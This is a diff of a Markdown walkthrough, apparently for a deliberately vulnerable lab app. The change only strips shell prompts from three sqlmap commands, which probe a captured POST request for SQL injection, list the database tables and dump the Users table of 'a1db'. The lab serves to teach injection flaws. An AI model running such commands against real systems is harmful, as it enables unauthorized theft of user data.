@@ -75,7 +75,7 @@ docker logs a1_api -f
 After that, we could now use `-r` option and wait sqlmap perform multiples malicious requests until it finds the vulnerable parameter:
 
 ```sh
-$ sqlmap -r postRequest.txt
+sqlmap -r postRequest.txt
 ```
 
 <img src="attack-4.png" align="center"/>
@@ -83,13 +83,13 @@ $ sqlmap -r postRequest.txt
 After understanding how this database is structured, an attacker could use the following command to retrieve database details:
 
 ```sh
-$ sqlmap -r postRequest.txt --tables
+sqlmap -r postRequest.txt --tables
 ```
 
 And then retrieve sensitive information from it:
 
 ```sh
-$ sqlmap -r postRequest.txt -D a1db -T Users --dump
+sqlmap -r postRequest.txt -D a1db -T Users --dump
 ```
 
 <img src="attack-5.png" align="center"/>
